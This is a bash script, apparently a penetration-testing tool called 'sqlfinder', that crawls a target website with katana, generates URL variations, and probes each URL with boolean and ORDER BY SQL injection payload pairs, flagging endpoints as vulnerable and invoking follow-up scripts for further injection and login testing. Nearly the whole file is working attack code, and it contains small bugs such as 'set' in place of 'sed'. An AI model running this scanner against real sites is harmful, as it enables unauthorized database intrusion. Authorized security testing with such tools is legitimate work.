#!/bin/bash
# sqlfinder v3.1
#Intensive scan enabled
#Added Count Check on pages
# ---------------- Colors ----------------
#-- Version Dev 1.1
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

WARNING="⚠️"
CHECK="✓"

#set -euo pipefail

# -------------- DEFAULTS
threads=20
file=""

vulnerable=false
verbose=false
header=""
intensive=false

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# ---------------- Help ----------------
show_help() {
  cat << 'EOF'

                                                          
 ▄▄▄▄▄▄▄       ▄▄    ▄▄▄▄▄▄▄              ▄▄             
█████▀▀▀       ██   ███▀▀▀▀▀ ▀▀           ██             
 ▀████▄  ▄████ ██   ███▄▄    ██  ████▄ ▄████ ▄█▀█▄ ████▄ 
   ▀████ ██ ██ ██   ███▀▀    ██  ██ ██ ██ ██ ██▄█▀ ██ ▀▀ 
███████▀ ▀████ ██   ███      ██▄ ██ ██ ▀████ ▀█▄▄▄ ██    
            ██ Crawling and Testing for SQL Injections---|=( 
            ▀▀                              
                                            by Cyber Samurai-- -|=
Usage:
  sqlfinder.sh <target> [options]
  sqlfinder.sh -f <file> [options]

Options:
  -f <file>          Load URLs from file instead of crawling
  -H <header>        Add custom HTTP header
  -t <threads>       Number of parallel requests (default: 1)
  -h, --help         Show this help message and exit
  -i                 Enable intense mode (time/error/union SQLi)

Examples:
  sqlfinder.sh https://example.com

  sqlfinder.sh -f urls.txt

  sqlfinder.sh https://example.com -t 50

  sqlfinder.sh https://example.com \
    -H "Authorization: Bearer eyJhbGciOi..."

  sqlfinder.sh -f api.txt -H "Cookie: session=abcd" -t 25

Description:
  sqlfinder crawls a target using katana (unless -f is used),
  filters URLs, and performs boolean-based SQL injection checks.

  By default, sqlfinder runs lightweight boolean checks.
  Use -i to enable aggressive SQL injection techniques.
  The Intense flag is still under development
EOF
}



# ---------------- Handle --help ----------------
for arg in "$@"; do
  if [[ "$arg" == "--help" ]]; then
    show_help
    exit 0
  fi
done

# ---------------- Positional target ----------------
target=""
if [[ "$1" != -* ]]; then
  target="$1"
  shift
fi

# ---------------- Parse flags ----------------
while getopts ":H:t:f:hiv" opt; do
  case "$opt" in
    H) header="$OPTARG" ;;
    t) threads="$OPTARG" ;;
    f) file="$OPTARG" ;;
    i) intensive=true ;;
    v) verbose=true ;;
    h)
      show_help
      exit 0
      ;;
    :)
      echo "Error: Option -$OPTARG requires an argument"
      exit 1
      ;;
    \?)
      echo "Invalid option: -$OPTARG"
      show_help
      exit 1
      ;;
  esac
done

#------------------DEBUG



#Validate input ----------------
if [[ -n "$file" ]] && [[ -n "$target" ]]; then
  echo "Error: Use either a target OR a file, not both"
  exit 1
fi

if [[ -z "$file" ]] && [[ -z "$target" ]]; then
  show_help
  exit 1
fi

if [[ -n "$file" ]] && [[ ! -f "$file" ]]; then
  echo "Error: File not found: $file"
  exit 1
fi



# ---------------- Curl body helper (for JavaScript check) ----------------
curl_body() {
  local CURL_ARGS=()
  
  [[ -n "$header" ]] && CURL_ARGS+=(-H "$header")
  
  curl -s "${CURL_ARGS[@]}" "$1"
}

# ---------------- Curl with size check ----------------
curl_with_size() {
  local url="$1"
  local CURL_ARGS=()
  
  CURL_ARGS=(-s -o /dev/null -w "%{http_code} %{size_download}" --parallel --parallel-max "$threads")
  [[ -n "$header" ]] && CURL_ARGS+=(-H "$header")
  CURL_ARGS+=("$url")
  
  curl "${CURL_ARGS[@]}"
}

# Creates variation on the url from the collect_urls - Katana | uro output
add_number_variations() {
    local exceptions=("cart" "checkout" "logout" "login" "profile" "settings" "account")
    
    while IFS= read -r url; do
        [[ -z "$url" ]] && continue
        # Check if URL already ends with a number
        if [[ "$url" =~ /[0-9]+$ ]]; then
            echo "$url"
            continue
        fi
        # Check if URL ends with any exception word
        skip=false
        for exception in "${exceptions[@]}"; do
            if [[ "$url" =~ /${exception}$ ]]; then
                echo "$url"
                skip=true
                break
            fi
        done
        [[ "$skip" == true ]] && continue
        # If not, create variations with numbers 1-3
        echo "$url"
        for i in {1..3}; do
            echo "${url}/${i}"
        done
    done
}
# ---------------- Website Crawler and URL Filtering ----------------
collect_urls() {
  local target="$1"
  local KATANA_ARGS=()

  KATANA_ARGS=(-u "$target" -jsl -silent)
  [[ -n "$header" ]] && KATANA_ARGS+=(-H "$header")

  katana "${KATANA_ARGS[@]}" 2>/dev/null \
    | uro \
    | grep -Ev '\.(js|tsx|php|html|htm)(\?|$)' \
    | sed 's/=[^&[:space:]]*/=/' \
    | set 's/:id//'
}

# ---------------- Curl helper ----------------
curl_cmd() {
  local url="$1"
  local output
  local CURL_ARGS=()

  CURL_ARGS=(-s -o /dev/null -w "%{http_code}" --parallel --parallel-max "$threads")
  [[ -n "$header" ]] && CURL_ARGS+=(-H "$header")
  CURL_ARGS+=("$url")

  output=$(curl "${CURL_ARGS[@]}")
  
  if [[ "$verbose" == true ]]; then
    echo "$url" 1>&2
  fi 
  echo "$output"  
}

# ---------------- Curl time helper ----------------
curl_time() {
  local CURL_ARGS=()
  
  CURL_ARGS=(-s -o /dev/null -w "%{time_total}")
  [[ -n "$header" ]] && CURL_ARGS+=(-H "$header")
  CURL_ARGS+=("$1")
  
  curl "${CURL_ARGS[@]}"
}

# ---------------- Test payload with size check ----------------
test_payload_with_size() {
  local url="$1"
  local payload="$2"
  
  # Get both status code and response size
  response_data=$(curl_with_size "${url}/${payload}")
  status_code=$(echo "$response_data" | awk '{print $1}')
  response_size=$(echo "$response_data" | awk '{print $2}')
  
  if [[ "$verbose" == true ]]; then
    echo -e "${BLUE}[*] Payload '$payload' returned: status=$status_code, size=$response_size${NC}" 1>&2
  fi
  
  echo "$status_code $response_size"
}

# ---------------- Function to get base URL without trailing number ----------------
get_base_url() {
  local url="$1"
  # Remove trailing /number pattern
  echo "$url" | sed -E 's|(/[0-9]+)+$||'
}

# ---------------- Function to compare response sizes ----------------
# Returns: 0 if sizes are similar (within threshold), 1 if different
compare_response_sizes() {
  local size1="$1"
  local size2="$2"
  local threshold="${3:-0.10}"  # 10% threshold by default
  
  # If either size is 0, can't compare
  if [[ "$size1" -eq 0 ]] || [[ "$size2" -eq 0 ]]; then
    return 1  # Consider them different
  fi
  
  # Calculate percentage difference
  local diff=$(( size1 > size2 ? size1 - size2 : size2 - size1 ))
  local percentage=$(echo "scale=4; $diff / $size1" | bc 2>/dev/null || echo "1")
  
  # Check if within threshold (using string comparison for bc output)
  if (( $(echo "$percentage <= $threshold" | bc -l 2>/dev/null || echo "0") )); then
    return 0  # Similar
  else
    return 1  # Different
  fi
}

# ---------------- INITIALIZE ---------------
clear
if [[ "$verbose" == true ]]; then
  echo -e "Verbose output enabled"
fi

if [[ -n "$header" ]]; then
    echo -e "${GREEN}-----------------------------------Authenticated Scan-----------------------------------${NC}"
else
    echo -e "${YELLOW}------------------------------Non Authenticated Scan------------------------------${NC}"
fi

if [[ -n "$threads" ]]; then
    echo -e "Scanning using ${GREEN}$threads${NC} parallel jobs"
fi

if [[ "$intensive" == true ]]; then
banner=$(cat << 'EOF'
                          ░▀█▀░█▀█░▀█▀░█▀▀░█▀█░█▀▀░▀█▀░█░█░█▀▀
                          ░░█░░█░█░░█░░█▀▀░█░█░▀▀█░░█░░▀▄▀░█▀▀
                          ░▀▀▀░▀░▀░░▀░░▀▀▀░▀░▀░▀▀▀░▀▀▀░░▀░░▀▀▀
                                S C A N     E N A B L E D 
EOF
)
    echo -e "${YELLOW}$banner${NC}"
fi
echo -e "${GREEN}Initializing Scan on target:${NC} ${YELLOW}${target}${NC}"

# ---------------- URL source ----------------
if [[ -n "$file" ]]; then
  urls="$(cat "$file")"
else
  urls="$(collect_urls "$target" | add_number_variations)"
fi

# ---------------- Scan loop ----------------
# Add this array for false positive response patterns
declare -a falsePositiveResponse=(
    "You need to enable JavaScript to run this app"
    "Please enable JavaScript"
    "JavaScript is required"
    "enable javascript"
    "requires JavaScript"
    "This application requires JavaScript"
    "JavaScript must be enabled"
    "Please turn on JavaScript"
)

# Array of payload pairs to test (true payload, false payload, description)
declare -a payload_pairs=(
  "1%20AND%201=1--%20- 1%20AND%202=1--%20- Standard boolean"
  "'1%20AND%201=1--%20- '1%20AND%202=1--%20- Quoted boolean"
  "\"%20AND%201=1--%20- \"%20AND%202=1--%20- Double-quoted boolean"
  "1%20OR%201=1--%20- 1%20OR%201=2--%20- OR boolean"
  "'1%20OR%201=1--%20- '1%20OR%201=2--%20- Quoted OR"
  "%20order%20by%201--%20- %20order%20by%2010--%20- ORDER BY"
  "'%20order%20by%201--%20- '%20order%20by%2010--%20- Quoted ORDER BY"
)

# Track vulnerable base URLs to avoid duplicate checks
declare -A vulnerable_bases=()

while IFS= read -r url; do
  [[ -z "$url" ]] && continue
  
  # Get base URL (without trailing /number)
  base_url=$(get_base_url "$url")
  
  # Skip if this base URL is already marked as vulnerable
  if [[ -n "${vulnerable_bases[$base_url]}" ]]; then
    if [[ "$verbose" == true ]]; then
      echo -e "${YELLOW}[*] Skipping $url (base URL $base_url already marked as vulnerable)${NC}" 1>&2
    fi
    continue
  fi
  
  vulnerable=false

  # ---- Stage 0: False positive response check (FIRST check before anything else)
  body_response=$(curl_body "$url")
  skip_url=false
  
  for pattern in "${falsePositiveResponse[@]}"; do
    if echo "$body_response" | grep -qi "$pattern"; then
      echo -e "${YELLOW}[-] Skipping (false positive): $url${NC}"
      echo -e "${BLUE}  Reason: Contains pattern: \"$pattern\"${NC}"
      skip_url=true
      break
    fi
  done
  
  if [[ "$skip_url" == true ]]; then
    continue
  fi

  # ---- Stage 1: base check (skip dead only)
  base_response=$(curl_with_size "$url")
  base_status=$(echo "$base_response" | awk '{print $1}')
  base_size=$(echo "$base_response" | awk '{print $2}')
  
  [[ "$base_status" == "000" ]] && continue
  
  if [[ "$verbose" == true ]]; then
    echo -e "${BLUE}[*] Baseline: $url - Status: $base_status, Size: $base_size${NC}" 1>&2
  fi

  # ---- Stage 2: boolean injection with size comparison
  for pair in "${payload_pairs[@]}"; do
    true_payload=$(echo "$pair" | awk '{print $1}')
    false_payload=$(echo "$pair" | awk '{print $2}')
    description=$(echo "$pair" | cut -d' ' -f3-)
    
    # Test true payload with size
    true_response=$(test_payload_with_size "$url" "$true_payload")
    true_status=$(echo "$true_response" | awk '{print $1}')
    true_size=$(echo "$true_response" | awk '{print $2}')
    
    # Test false payload with size
    false_response=$(test_payload_with_size "$url" "$false_payload")
    false_status=$(echo "$false_response" | awk '{print $1}')
    false_size=$(echo "$false_response" | awk '{print $2}')
    
    # Check if we have a potential boolean injection
    if [[ "$true_status" == "200" ]] && [[ "$false_status" != "200" ]]; then
      # Now check if the true response is similar to baseline
      if compare_response_sizes "$base_size" "$true_size"; then
        # True response is similar to baseline - GOOD SIGN
        echo -e "${WARNING}${RED} VULNERABLE${NC} $url"
        echo -e "Payload: ${YELLOW}${url}/${false_payload//%20/ }${NC}"
        echo -e "Reason: ${BLUE}Boolean injection - $description${NC}"
        echo -e "        ${BLUE}Baseline: status=$base_status, size=$base_size${NC}"
        echo -e "        ${BLUE}True payload: status=$true_status, size=$true_size (similar to baseline)${NC}"
        echo -e "        ${BLUE}False payload: status=$false_status, size=$false_size${NC}"
        
        vulnerable=true
        vulnerable_bases["$base_url"]=1
        
        # Run additional tests
        if [[ -n "$header" ]]; then
          "$SCRIPT_DIR/sqlDiffFinder.sh" -u "$url" -H "$header" || true
        else
          "$SCRIPT_DIR/sqlDiffFinder.sh" -u "$url" || true
        fi
        
        "$SCRIPT_DIR/sqlogin.sh" "$url" || true
        break 2  # Break out of both loops
      else
        # True response is different from baseline - POSSIBLE FALSE POSITIVE
        if [[ "$verbose" == true ]]; then
          echo -e "${YELLOW}[*] Potential false positive: True payload response differs from baseline${NC}" 1>&2
          echo -e "${YELLOW}[*] Baseline size: $base_size vs True payload size: $true_size${NC}" 1>&2
        fi
        continue
      fi
    elif [[ "$true_status" == "200" ]] && [[ "$false_status" == "200" ]]; then
      # Both return 200, check if sizes are different (could still be boolean)
      if ! compare_response_sizes "$true_size" "$false_size" "0.05"; then  # 5% threshold for difference
        # Different sizes with same status - could be boolean
        if compare_response_sizes "$base_size" "$true_size"; then
          # True response similar to baseline
          echo -e "${WARNING}${RED} VULNERABLE${NC} $url"
          echo -e "Payload: ${YELLOW}${url}/${false_payload//%20/ }${NC}"
          echo -e "Reason: ${BLUE}Boolean injection (same status, different content) - $description${NC}"
          echo -e "        ${BLUE}Both return 200 but different content sizes${NC}"
          echo -e "        ${BLUE}True size: $true_size (similar to baseline: $base_size)${NC}"
          echo -e "        ${BLUE}False size: $false_size (different from true)${NC}"
          
          vulnerable=true
          vulnerable_bases["$base_url"]=1
          
          # Run additional tests
          if [[ -n "$header" ]]; then
            "$SCRIPT_DIR/sqlDiffFinder.sh" -u "$url" -H "$header" || true
          else
            "$SCRIPT_DIR/sqlDiffFinder.sh" -u "$url" || true
          fi
          
          "$SCRIPT_DIR/sqlogin.sh" "$url" || true
          break 2  # Break out of both loops
        fi
      fi
    fi
  done

  # ---- Stage 3: Additional check: ORDER BY incremental testing
  if [[ "$vulnerable" == false ]] && [[ "$intensive" == true ]]; then
    if [[ "$verbose" == true ]]; then
      echo -e "${BLUE}[*] Testing ORDER BY column count...${NC}" 1>&2
    fi
    
    # Test ORDER BY with increasing column numbers
    for i in {1..20}; do
      order_payload="%20order%20by%20${i}--%20-"
      order_response=$(curl_with_size "${url}/${order_payload}")
      order_status=$(echo "$order_response" | awk '{print $1}')
      order_size=$(echo "$order_response" | awk '{print $2}')
      
      if [[ "$order_status" != "200" ]] && [[ "$order_status" != "000" ]] && [[ "$order_status" != "404" ]]; then
        echo -e "${WARNING}${RED} VULNERABLE${NC} $url"
        echo -e "Payload: ${YELLOW}${url}/ order by ${i}-- -${NC}"
        echo -e "Reason: ${BLUE}ORDER BY error at column $i (response: $order_status)${NC}"
        vulnerable=true
        vulnerable_bases["$base_url"]=1
        
        # Run additional tests
        if [[ -n "$header" ]]; then
          "$SCRIPT_DIR/sqlDiffFinder.sh" -u "$url" -H "$header" || true
        else
          "$SCRIPT_DIR/sqlDiffFinder.sh" -u "$url" || true
        fi
        
        "$SCRIPT_DIR/sqlogin.sh" "$url" || true
        break
      fi
    done
  fi

  # ---- Final safe output
  if [[ "$vulnerable" == false ]]; then
    echo -e "${GREEN}[ ${CHECK} ] $url${NC}"
  fi

done <<< "$urls"